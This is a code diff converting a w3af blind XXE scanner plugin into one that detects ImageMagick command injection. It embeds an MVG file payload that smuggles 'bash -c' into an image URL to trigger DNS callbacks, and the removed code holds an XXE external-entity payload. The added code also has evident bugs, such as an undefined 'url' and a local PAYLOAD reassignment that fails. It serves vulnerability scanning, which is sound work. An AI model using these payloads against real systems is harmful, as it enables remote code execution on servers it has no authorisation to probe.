@@ -5,23 +5,30 @@ from w3af.core.controllers.plugins.audit_plugin import AuditPlugin
 from w3af.core.data.options.opt_factory import opt_factory
 from w3af.core.data.options.option_list import OptionList
 from w3af.core.data.fuzzer.fuzzer import create_mutants
-from w3af.core.data.fuzzer.mutants.xml_mutant import XMLMutant
+from w3af.core.data.fuzzer.mutants.filecontent_mutant import FileContentMutant
 
 import w3af.core.controllers.output_manager as om
 import w3af.core.data.constants.severity as severity
 
 from w3af.core.data.kb.vuln import Vuln
+from w3af.core.data.kb.info import Info
 from w3af.core.controllers.exceptions import HTTPRequestException
 
 from w3af.core.controllers.core_helpers.detect_resolve import Resolver
 
 
-class xxe(AuditPlugin):
+class imagemagic(AuditPlugin):
 	"""
-	Identify XXE injection (blind method)
+	Identify imagemagic os-injection (blind method)
 
 	:author: @s0i37
 	"""
+	PAYLOAD = '''
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://{detect}"|bash -c "ping {rce})'
+pop graphic-context
+	'''
 
 	def __init__(self):
 		AuditPlugin.__init__(self)
@@ -33,25 +40,32 @@ class xxe(AuditPlugin):
 			om.out.debug("DNS zone not configured!")
 			return
 
-		self.fqdn = "xxe.{target}.{domain}".format( target=freq.get_uri().get_domain(), domain=self._dns_zone )
-		for mutant in create_mutants(freq, ['&a;', ]):
-			if isinstance(mutant, XMLMutant):
-				mutant.get_dc().doctype = '<!DOCTYPE aa [\n'
-				mutant.get_dc().doctype += ' <!ENTITY a SYSTEM "http://{FQDN}">\n'.format( FQDN=self.fqdn )
-				mutant.get_dc().doctype += ']>'
+		self.fqdn_imagemagic_exist = "im.{target}.{domain}".format( target=freq.get_uri().get_domain(), domain=self._dns_zone )
+		self.fqdn_imagemagic_vuln = "rce.{target}.{domain}".format( target=freq.get_uri().get_domain(), domain=self._dns_zone )
+		PAYLOAD = PAYLOAD.format( detect=self.fqdn_imagemagic_exist, rce=self.fqdn_imagemagic_vuln )
+		for mutant in create_mutants(freq, [PAYLOAD, ]):
+			if isinstance(mutant, FileContentMutant):
 				try:
 					response = self._uri_opener.send_mutant( mutant, cache=False, timeout=10 )
-					if self.check(self.fqdn):
-						desc = 'XXE injection at: "%s", using'\
+					if self.check(self.fqdn_imagemagic_exist):
+						desc = 'Imagemagic found: "%s"' % response.get_uri()
+						i = Info('Imagemagic detected', desc, response.id, self.get_name())
+						i.add_to_highlight('Imagemagic')
+						i.set_url(url)
+						self.kb_append_uniq('imagemagic', i)
+
+					if self.check(self.fqdn_imagemagic_vuln):
+						desc = 'Imagemagic OS-injection at: "%s", using'\
 							' HTTP method %s. The injectable parameter may be: "%s"'
 						desc = desc % ( mutant.get_url(),
 										mutant.get_method(),
 										mutant.get_token_name() )
-						vuln = Vuln.from_mutant('XXE injection vulnerability', desc,
+						vuln = Vuln.from_mutant('Imagemagic OS-injection vulnerability', desc,
 										severity.HIGH, response.id, 'xxe',
 										mutant)
 						om.out.debug( vuln.get_desc() )
-						om.out.vulnerability("XXE injection", severity=severity.HIGH)
+						om.out.vulnerability("imagemagic os injection", severity=severity.HIGH)
+
 				except HTTPRequestException:
 					om.out.debug("HTTPRequestException")
 				except Exception as e:
@@ -88,9 +102,9 @@ class xxe(AuditPlugin):
 		:return: A DETAILED description of the plugin functions and features.
 		"""
 		return """
-		This plugin finds XXE injections (blind method) using dns request.
-		In case if XXE is exists the victim will send dns-request. Then we
-		send no-recursive dns-request to the same dns-name.
+		This plugin finds imagemagic OS injections (blind method) using dns request.
+		In case if imagemagic is exists and if vulnerable one the victim will send one or two dns-requests respectively.
+		Then we	send no-recursive dns-request to the same dns-name.
 
 		Only one configurable parameters exists:
 		    - dns_zone
